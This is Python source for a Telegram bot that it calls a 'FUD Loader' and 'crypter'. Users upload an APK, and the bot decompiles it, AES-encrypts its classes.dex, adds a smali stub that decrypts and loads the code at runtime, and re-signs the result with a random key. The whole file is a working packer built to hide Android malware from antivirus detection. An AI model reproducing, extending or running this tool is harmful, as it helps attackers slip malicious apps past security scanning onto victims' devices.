import os, json, logging, subprocess, shutil, random, string, uuid, base64, re
from pathlib import Path
from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = os.getenv('BOT_TOKEN')
ALLOWED_USERS = json.loads(os.getenv('ALLOWED_USERS', '[]'))
WORK_DIR = os.getenv('WORK_DIR', '/tmp/work')
TEMP_DIR = os.getenv('TEMP_DIR', '/tmp/temp')

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN not set")

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

def ensure_dirs():
    Path(WORK_DIR).mkdir(parents=True, exist_ok=True)
    Path(TEMP_DIR).mkdir(parents=True, exist_ok=True)

def is_allowed(uid):
    return not ALLOWED_USERS or uid in ALLOWED_USERS

def run_cmd(cmd, timeout=300):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        if r.returncode != 0:
            logger.error(f"Cmd failed: {' '.join(cmd)}\n{r.stderr}")
            return False
        return True
    except subprocess.TimeoutExpired:
        logger.error("Command timed out")
        return False

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Fixed smali code – no random names, perfectly valid
STUB_APP = """.class public Lcom/stub/StubApp;
.super Landroid/app/Application;

.method public onCreate()V
    .registers 8
    .prologue
    :try_start
    invoke-virtual {p0}, Lcom/stub/StubApp;->getApplicationContext()Landroid/content/Context;
    move-result-object v0

    const-string v1, "key.txt"
    invoke-virtual {p0}, Lcom/stub/StubApp;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v2
    invoke-virtual {v2, v1}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v1
    invoke-static {v1}, Lcom/stub/Util;->readBytes(Ljava/io/InputStream;)[B
    move-result-object v1
    new-instance v2, Ljava/lang/String;
    invoke-direct {v2, v1}, Ljava/lang/String;-><init>([B)V
    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object v2
    invoke-static {v2}, Lcom/stub/Util;->hexToBytes(Ljava/lang/String;)[B
    move-result-object v3

    const-string v4, "payload.dex"
    invoke-virtual {p0}, Lcom/stub/StubApp;->getAssets()Landroid/content/res/AssetManager;
    move-result-object v5
    invoke-virtual {v5, v4}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
    move-result-object v4
    invoke-static {v4}, Lcom/stub/Util;->readBytes(Ljava/io/InputStream;)[B
    move-result-object v4

    const-string v5, "AES/ECB/PKCS5Padding"
    invoke-static {v5}, Ljavax/crypto/Cipher;->getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;
    move-result-object v5
    new-instance v6, Ljavax/crypto/spec/SecretKeySpec;
    const-string v7, "AES"
    invoke-direct {v6, v3, v7}, Ljavax/crypto/spec/SecretKeySpec;-><init>([BLjava/lang/String;)V
    const/4 v7, 0x2
    invoke-virtual {v5, v7, v6}, Ljavax/crypto/Cipher;->init(ILjava/security/Key;)V
    invoke-virtual {v5, v4}, Ljavax/crypto/Cipher;->doFinal([B)[B
    move-result-object v4

    const-string v6, "odex"
    const/4 v7, 0x0
    invoke-virtual {p0, v6, v7}, Lcom/stub/StubApp;->getDir(Ljava/lang/String;I)Ljava/io/File;
    move-result-object v6
    new-instance v7, Ljava/io/File;
    const-string v8, "original.dex"
    invoke-direct {v7, v6, v8}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    new-instance v8, Ljava/io/FileOutputStream;
    invoke-direct {v8, v7}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {v8, v4}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {v8}, Ljava/io/FileOutputStream;->close()V

    new-instance v8, Ldalvik/system/DexClassLoader;
    invoke-virtual {v7}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v9
    invoke-virtual {v6}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v10
    const/4 v11, 0x0
    invoke-virtual {p0}, Lcom/stub/StubApp;->getClassLoader()Ljava/lang/ClassLoader;
    move-result-object v12
    invoke-direct/range {v8 .. v12}, Ldalvik/system/DexClassLoader;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V
    # Load original application class (fixed name)
    const-string v9, "com.original.App"   # <-- will be replaced
    invoke-virtual {v8, v9}, Ldalvik/system/DexClassLoader;->loadClass(Ljava/lang/String;)Ljava/lang/Class;
    move-result-object v9
    invoke-virtual {v9}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;
    move-result-object v9
    check-cast v9, Landroid/app/Application;
    const-class v10, Landroid/app/Application;
    const-string v11, "mBase"
    invoke-virtual {v10, v11}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
    move-result-object v10
    const/4 v11, 0x1
    invoke-virtual {v10, v11}, Ljava/lang/reflect/Field;->setAccessible(Z)V
    invoke-virtual {p0}, Lcom/stub/StubApp;->getBaseContext()Landroid/content/Context;
    move-result-object v11
    invoke-virtual {v10, v9, v11}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
    invoke-virtual {v9}, Landroid/app/Application;->onCreate()V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_0
    return-void
    :catch_0
    move-exception v0
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    # fallback – start launcher activity
    :try_start2
    invoke-virtual {p0}, Lcom/stub/StubApp;->getApplicationContext()Landroid/content/Context;
    move-result-object v0
    new-instance v1, Landroid/content/Intent;
    const-string v2, "android.intent.action.MAIN"
    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
    new-instance v2, Landroid/content/ComponentName;
    const-string v3, "com.original.package"
    const-string v4, "com.original.MainActivity"
    invoke-direct {v2, v3, v4}, Landroid/content/ComponentName;-><init>(Ljava/lang/String;Ljava/lang/String;)V
    invoke-virtual {v1, v2}, Landroid/content/Intent;->setComponent(Landroid/content/ComponentName;)Landroid/content/Intent;
    const/high16 v2, 0x10000000
    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v1}, Lcom/stub/StubApp;->startActivity(Landroid/content/Intent;)V
    :try_end2
    .catch Ljava/lang/Exception; {:try_start2 .. :try_end2} :catch_1
    :catch_1
    return-void
.end method
"""

STUB_UTIL = """.class public Lcom/stub/Util;
.super Ljava/lang/Object;

.method public static readBytes(Ljava/io/InputStream;)[B
    .registers 4
    new-instance v0, Ljava/io/ByteArrayOutputStream;
    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V
    const/16 v1, 0x400
    new-array v1, v1, [B
    :loop
    invoke-virtual {p0, v1}, Ljava/io/InputStream;->read([B)I
    move-result v2
    const/4 v3, -0x1
    if-eq v2, v3, :write
    const/4 v3, 0x0
    invoke-virtual {v0, v1, v3, v2}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    goto :loop
    :write
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v0
    return-object v0
.end method

.method public static hexToBytes(Ljava/lang/String;)[B
    .registers 7
    invoke-virtual {p0}, Ljava/lang/String;->length()I
    move-result v0
    div-int/lit8 v0, v0, 0x2
    new-array v1, v0, [B
    const/4 v2, 0x0
    :loop
    if-ge v2, v0, :endloop
    mul-int/lit8 v3, v2, 0x2
    add-int/lit8 v4, v3, 0x2
    invoke-virtual {p0, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;
    move-result-object v3
    const/16 v4, 0x10
    invoke-static {v3, v4}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I
    move-result v3
    int-to-byte v3, v3
    aput-byte v3, v1, v2
    add-int/lit8 v2, v2, 0x1
    goto :loop
    :endloop
    return-object v1
.end method
"""

def dropper_protect(input_apk: str, output_apk: str) -> bool:
    ensure_dirs()
    dec_dir = os.path.join(TEMP_DIR, 'dec_' + uuid.uuid4().hex[:6])
    rebuilt = os.path.join(TEMP_DIR, 'rebuilt.apk')
    aligned = os.path.join(TEMP_DIR, 'aligned.apk')
    encrypted_dex = os.path.join(TEMP_DIR, 'payload.enc')
    ks_path = os.path.join(TEMP_DIR, 'rand.keystore')

    if not run_cmd(['apktool', 'd', '-f', '-o', dec_dir, input_apk], timeout=180):
        return False

    try:
        manifest_path = os.path.join(dec_dir, 'AndroidManifest.xml')
        with open(manifest_path, 'r', encoding='utf-8') as f:
            manifest = f.read()

        package_name = re.search(r'package="([^"]+)"', manifest).group(1)
        main_activity = None
        app_class = None

        app_match = re.search(r'<application[^>]*android:name="([^"]*)"', manifest)
        if app_match:
            app_class = app_match.group(1)
            if app_class.startswith('.'):
                app_class = package_name + app_class

        launcher_re = re.search(r'<activity[^>]*>.*?<action android:name="android\.intent\.action\.MAIN".*?>.*?</activity>', manifest, re.DOTALL)
        if launcher_re:
            act_block = launcher_re.group(0)
            act_name = re.search(r'android:name="([^"]+)"', act_block)
            if act_name:
                main_activity = act_name.group(1)
                if main_activity.startswith('.'):
                    main_activity = package_name + main_activity
        if not main_activity:
            first_act = re.search(r'<activity[^>]*android:name="([^"]+)"', manifest)
            if first_act:
                main_activity = first_act.group(1)
                if main_activity.startswith('.'):
                    main_activity = package_name + main_activity
        if not main_activity:
            logger.error("Cannot determine main activity")
            return False

        # Encrypt classes.dex
        import zipfile
        with zipfile.ZipFile(input_apk, 'r') as zf:
            dex_data = zf.read('classes.dex')
        key = os.urandom(16)
        key_hex = base64.b16encode(key).decode().lower()
        dex_path = os.path.join(TEMP_DIR, 'classes.dex')
        with open(dex_path, 'wb') as f:
            f.write(dex_data)
        if not run_cmd(['openssl', 'enc', '-aes-128-ecb', '-K', key_hex, '-in', dex_path, '-out', encrypted_dex], timeout=60):
            return False

        # Assets
        assets_dir = os.path.join(dec_dir, 'assets')
        os.makedirs(assets_dir, exist_ok=True)
        shutil.copy(encrypted_dex, os.path.join(assets_dir, 'payload.dex'))
        with open(os.path.join(assets_dir, 'key.txt'), 'w') as f:
            f.write(key_hex)

        # Remove original smali
        for item in os.listdir(dec_dir):
            if item.startswith('smali'):
                shutil.rmtree(os.path.join(dec_dir, item), ignore_errors=True)

        # Create stub smali with fixed package
        stub_dir = os.path.join(dec_dir, 'smali', 'com', 'stub')
        os.makedirs(stub_dir, exist_ok=True)

        # Replace the placeholder with actual class/activity
        stub_app_content = STUB_APP
        if app_class:
            stub_app_content = stub_app_content.replace('com.original.App', app_class)
        else:
            stub_app_content = stub_app_content.replace(
                'const-string v9, "com.original.App"',
                'const-string v9, "android.app.Application"'
            )
        # Update fallback main activity
        stub_app_content = stub_app_content.replace('com.original.package', package_name)
        stub_app_content = stub_app_content.replace('com.original.MainActivity', main_activity)

        with open(os.path.join(stub_dir, 'StubApp.smali'), 'w') as f:
            f.write(stub_app_content)
        with open(os.path.join(stub_dir, 'Util.smali'), 'w') as f:
            f.write(STUB_UTIL)

        # Modify manifest: set Application class to stub
        with open(manifest_path, 'r', encoding='utf-8') as f:
            manifest = f.read()
        manifest = re.sub(r'(<application[^>]*?)android:name="[^"]*"', r'\1', manifest)
        manifest = manifest.replace('<application', '<application android:name="com.stub.StubApp"')
        with open(manifest_path, 'w', encoding='utf-8') as f:
            f.write(manifest)

        if not run_cmd(['apktool', 'b', '-o', rebuilt, dec_dir], timeout=180):
            return False
        if not run_cmd(['zipalign', '-v', '-p', '4', rebuilt, aligned], timeout=60):
            return False

        ks_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        alias = ''.join(random.choices(string.ascii_letters, k=6))
        dname = f"CN={''.join(random.choices(string.ascii_letters, k=5))}, OU=Dev, O=Org, L=Loc, ST=ST, C={random.choice(['US','GB','IN'])}"
        if not run_cmd(['keytool', '-genkey', '-v', '-keystore', ks_path, '-alias', alias, '-keyalg', 'RSA', '-keysize', '2048', '-validity', '365', '-storepass', ks_pass, '-keypass', ks_pass, '-dname', dname], timeout=30):
            return False
        if not run_cmd(['apksigner', 'sign', '--ks', ks_path, '--ks-pass', f'pass:{ks_pass}', '--ks-key-alias', alias, '--out', output_apk, aligned], timeout=30):
            return False

        return True
    except Exception as e:
        logger.exception("Dropper protect failed")
        return False
    finally:
        shutil.rmtree(dec_dir, ignore_errors=True)
        for f in [encrypted_dex, rebuilt, aligned, ks_path]:
            try: os.remove(f)
            except: pass
        try: os.remove(dex_path)
        except: pass

# Telegram handlers (same as before)
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("Access denied.")
        return
    await update.message.reply_text("FUD Loader Bot ready. Send APK.")

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_allowed(uid):
        await update.message.reply_text("Access denied.")
        return
    doc: Document = update.message.document
    if not doc.file_name or not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("Only APK accepted.")
        return
    await update.message.reply_text("Processing with crypter... (max 2 min)")
    fin = os.path.join(WORK_DIR, f"{uid}_{doc.file_name}")
    await (await doc.get_file()).download_to_drive(fin)
    base, ext = os.path.splitext(doc.file_name)
    fout = os.path.join(WORK_DIR, f"{base}_fud{ext}")
    success = False
    try:
        success = dropper_protect(fin, fout)
    except Exception as e:
        logger.exception("Error")
    try: os.remove(fin)
    except: pass
    if success:
        with open(fout, "rb") as f:
            await update.message.reply_document(
                document=f,
                filename=os.path.basename(fout),
                caption="FUD Loader APK ready."
            )
        try: os.remove(fout)
        except: pass
    else:
        await update.message.reply_text("Processing failed. Check logs.")
        if os.path.exists(fout): os.remove(fout)

async def err_handler(update, context):
    logger.error(context.error)

def main():
    ensure_dirs()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_doc))
    app.add_error_handler(err_handler)
    logger.info("Bot starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
